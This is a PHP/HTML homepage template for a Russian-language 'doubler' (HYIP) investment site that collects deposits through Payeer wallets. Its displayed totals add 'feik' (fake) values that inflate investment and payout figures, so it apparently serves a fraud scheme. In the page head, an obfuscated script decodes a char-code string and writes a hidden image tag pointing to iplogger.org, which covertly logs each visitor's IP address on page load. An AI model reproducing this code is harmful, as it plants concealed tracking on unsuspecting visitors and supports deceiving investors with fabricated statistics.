<!DOCTYPE>
<html>
<?
/*ТУТ ЗАДАЮТСЯ ПЕРЕМЕННЫЕ ДЛЯ "Инвесторов", "Инвестировано (сумма)", "выплачено (сумма)", "резерв" И ПР.*/
$invcount=$db->fetch($db->query("SELECT COUNT(id) as invcount FROM ss_users WHERE curator>0"));
$invcount=$invcount['invcount'];


$depmoney=$db->fetch($db->query("SELECT SUM(summa) as depmoney FROM deposits WHERE curatorid>0"));
$depmoney=$depmoney['depmoney'];

$wthmoney=$db->fetch($db->query("SELECT SUM(summa) as wthmoney FROM deposits  WHERE status=?i AND curatorid!=?i ",1,0));
$wthmoney=$wthmoney['wthmoney']+($wthmoney['wthmoney']*($deppercentage/100));

$wthmoneyref=$db->fetch($db->query("SELECT SUM(summa) as wthmoneyref FROM deposits WHERE status=?i AND curatorid=?i",1,0));
$wthmoneyref=$wthmoneyref['wthmoneyref'];

$wthmoneyadm=$db->fetch($db->query("SELECT SUM(summa) as wthmoneyadmf FROM deposits WHERE status=?i AND curatorid=?i",1,0));
$wthmoneyadm=$wthmoneyadm['wthmoneyadmf'];

$budget=$depmoney-$wthmoney-$wthmoneyref;
if($budget<0){$budget=0;}

$depmoney=number_format(($depmoney+$depmoney_feik),2,'.',',');
$wthmoneyall=number_format(($wthmoney+$wthmoneyref+$wthmoneyref+$wthmoneyall_feik),2,'.',',');
$wthmoney=number_format($wthmoney,2,'.',',');
$wthmoneyref=number_format($wthmoneyref,2,'.',',');
$budget=number_format($budget,2,'.',',');
?>
<?
/*А ТУТ КОЛИЧЕСТВО ВЫПЛАТ И ДЕПОВ*/
if(!empty($id)){
//$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
$mydeps=$db->numRows($db->query("SELECT id FROM deposits WHERE userid=?i AND curatorid!='0'",$id));
$mydeps='(<span id="count_my">'.$mydeps.'</span>)';
}else{
$mydeps='';
}

$opened=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i AND curatorid>0",0));
$closed=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i AND curatorid>0",1));
$all=$opened;

$closedall=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i AND curatorid!=?i",1,0));

?> 
 
<?
/*По итогу, вот список переменных, с которыми можно работать:*/
//$all - Количество депозитов
//$closedall - Количество выплат
//$mydeps - количество моих депозитов (кол-во депов залогиненого юзера)
//$invcount - количество юзеров в системе
//$depmoney - сколько всего вложено
//$wthmoney - сколько всего выплачено по депам
//$wthmoneyref - выплачено рефских
//$wthmoneyall - всего выплачено
//$budget - резерв системы
?>
<head>
<title><?=$sitename?> | +<?=$deppercentage?>% за <?=$timeprofit?></title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="description" content="Крутой проект">
<meta name="keywords" content="Payeer, удвоитель, doubler, money, hyip, mlm, game">
<link href="/style/styles.css" rel="stylesheet" type="text/css">
<link href="/style/font-awesome/css/font-awesome.min.css" rel="stylesheet">
<link href="pay_files/css_002.css" rel="stylesheet" type="text/css">
<link href="pay_files/css.css" rel="stylesheet" type="text/css">
<link href="pay_files/css_005.css" rel="stylesheet" type="text/css">
<link href="pay_files/css_003.css" rel="stylesheet">
<link href="pay_files/css_006.css" rel="stylesheet">
<link href="pay_files/css_007.css" rel="stylesheet">
<link href="pay_files/css_004.css" rel="stylesheet">
<link rel="stylesheet" href="pay_files/tabsstyle.css" type="text/css">
<link rel="stylesheet" href="pay_files/transtabstyle.htm" type="text/css">
<link rel="stylesheet" href="pay_files/calcpopupstyle.htm" type="text/css">
<link rel="stylesheet" href="pay_files/faqstyle.css" type="text/css">
<link rel="stylesheet" type="text/css" href="pay_files/font-awesome.css">
<link href="https://fonts.googleapis.com/css?family=Roboto+Slab" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="pay_files/style.css">
<link rel="shortcut icon" type="image/ico" href="/favicon.ico">
<script src="/templ/main/files/watch.js" async="" type="text/javascript"></script>
<script src="/templ/main/files/jquery.js"></script>
<style type="text/css"></style>
</head>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>  
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>
<script>
		$(document).ready(function(){
			setInterval(function(){
				$('.countdown').each(function(){
					var time=$(this).text().split(':');
					var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
					var hours=Math.floor(timestamp/3600);
					var minutes=Math.floor((timestamp- hours*3600)/ 60);
					var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}
					
				if(minutes<10){minutes='0'+ minutes;}
				if(seconds<10){seconds='0'+ seconds;}
				if(timestamp>0){
				$(this).text(hours+':'+ minutes+':'+ seconds);
				}
				});
		},1000);

		})
</script>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
<body>
<div id="wrapper"> 
<div class="topbg">
<div class="wrap">
<div class="topcontainer">
<div class="lefttop">
<p>Лучшие инвестиционные условия</p>
</div> <!--lefttop-->
<div class="social">
<a href="<?=$vkgrup?>" target="_blank"><img src="pay_files/vkontakte.png"></a>
<a href="<?=$telega?>" target="_blank"><img src="pay_files/Telegram.png"></a>
</div>
</div>
<div class="menu_container">   
<div class="logo">
<a href="/" style="font-size: 30px;"><?=$sitename?></a>
</div>
<div class="menu">
<ul>
<li><a href="/">ГЛАВНАЯ</a> </li>
<li><a href="/?page=faq">FAQ</a> </li>
<li><a href="/?page=rules">ПРАВИЛА</a> </li>
<li><a href="/?page=contacts">ПОДДЕРЖКА</a> </li>
</ul>
</div>
</div>
<div class="slide_container">
<?if(!empty($_error)){?><br><br><font color="red"><?=$_error?></font><br><br><?}?>
<?if(!empty($_success)){?><br><br><font color="green"><?=$_success?></font><br><br><?}?>				
<?if(empty($id)){?>		
<div class="slide_text">
<h2>MINERS AT WORK</h2>
<h3>Введите свой payeer кошелек</h3>
</div>
<form action="" method="post">	
<input type="hidden" name="do" value="toaccount">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<table width="930" height="21px" border="0" cellpadding="0" cellspacing="0">
<tbody>				
<tr>
<td align="center">
<input autocomplete="off" name="wallet" type="text" size="23" maxlength="35" placeholder="Пример ввода: P12345678" class="button -green_border -login -login_white" style="width: 308px;"><input type="submit" name="submit" id="form" value="ПРОДОЛЖИТЬ" class="button -green -cash">
</td>
</tr>
</tbody></table>
</form>
</div>
<?}else{?>		
<?
if(!empty($id)){
$wallet=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id);
?>
<?
$ihra=$db->getOne("SELECT curator FROM ss_users WHERE id=?i",$id);
?>
	
<?}?>
<table width="300px" border="0">
<tbody><tr>  
<td style="list-style-type: none;">
<li width="169" class="animated zoomIn" style="padding-bottom: 7px;">
<?
$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
?>
<a id="k" href="/?page=referals" style="text-decoration: none;" title="Ваши приглашенные партнеры"><font>Рефералы - <?=$ihr?></font></a></li>

<li width="751" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" href="/?page=my" style="text-decoration: none" title="Ваши открытые депозиты"><font>Мои депозиты</font></a></li>

<li width="180" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" href="/?page=exit" style="text-decoration: none" title="Выйти из аккаунта"><font>Выход</font></a></li>
</td>

<td style="list-style-type: none;">
<li width="180" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" style="text-decoration: none" title="Ваш логин в системе"><font><?=$wallet?></font></a></li>

<li width="169" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" style="text-decoration: none;" title="Ваш личный идентификатор"><font>Ваш id - <?=$id?></font></a></li>

<li width="751" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" style="text-decoration: none" title="Идентификатор вашего пригласителя"><font>Куратор id - <?=$ihra?></font></a></li>

</td>
</tr>
</tbody></table>
<form action="" method="post">	
<input type="hidden" name="do" value="payeer_pay">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<table width="930" height="21px" border="0" cellpadding="0" cellspacing="0">
<tbody><tr>
<td align="center">
<br><b style="color:#fff;">Введите сумму вклада (от <?=$mindep?> до <?=$maxdep?> рублей) и нажмите ПРОДОЛЖИТЬ</b>
<br><br>
<input autocomplete="off" name="m_amount" type="text" size="23" maxlength="35" placeholder="Введите сумму" class="button -green_border -login -login_white" style="width: 320px;"><input type="submit" name="submit" id="form" value="ПРОДОЛЖИТЬ" class="button -green -cash">
</td>
</tr>
</tbody></table>
</form>
<?}?>
</div>
</div>
</div>
</div>
<div class="clear"></div>